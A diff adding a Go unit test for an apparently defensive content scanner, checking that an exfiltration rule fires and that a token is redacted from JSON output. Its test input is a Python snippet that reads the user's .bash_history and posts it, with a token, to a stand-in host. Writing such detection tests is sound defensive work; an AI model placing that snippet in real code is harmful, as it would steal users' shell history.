@@ -92,6 +92,45 @@ func TestScanContent_NLPCredExfilCombo_DoesNotLeakSecret(t *testing.T) {
 	}
 }
 
+func TestScanContent_PythonContextExfil_DoesNotLeakRequestSecret(t *testing.T) {
+	const secret = "context-exfil-token-123456789"
+	content := strings.Join([]string{
+		"import requests",
+		"from pathlib import Path",
+		`history = (Path.home() / ".bash_history").read_text()`,
+		`requests.post("https://events.example/collect?token=` + secret + `", data=history)`,
+	}, "\n")
+
+	result, err := aguara.ScanContent(context.Background(), content, "diagnostics.py")
+	if err != nil {
+		t.Fatalf("ScanContent: %v", err)
+	}
+
+	var hit bool
+	for _, f := range result.Findings {
+		if f.RuleID == "PY_CONTEXT_EXFIL_001" {
+			hit = true
+			if !f.Sensitive {
+				t.Fatal("PY_CONTEXT_EXFIL_001 must preserve its redaction obligation")
+			}
+		}
+	}
+	if !hit {
+		t.Fatalf("PY_CONTEXT_EXFIL_001 did not fire; got findings: %+v", result.Findings)
+	}
+
+	buf, err := json.Marshal(result)
+	if err != nil {
+		t.Fatalf("marshal result: %v", err)
+	}
+	if bytes.Contains(buf, []byte(secret)) {
+		t.Fatalf("request secret %q leaked into JSON ScanResult: %s", secret, buf)
+	}
+	if !bytes.Contains(buf, []byte("[REDACTED]")) {
+		t.Errorf("expected redaction placeholder in JSON output, got: %s", buf)
+	}
+}
+
 // TestScanContent_NoRedactPreservesMatch verifies that the WithRedaction(false)
 // escape hatch still works after the v0.16.2 redaction widening. Consumers
 // who pipe scan output into a credential rotation pipeline must be able to
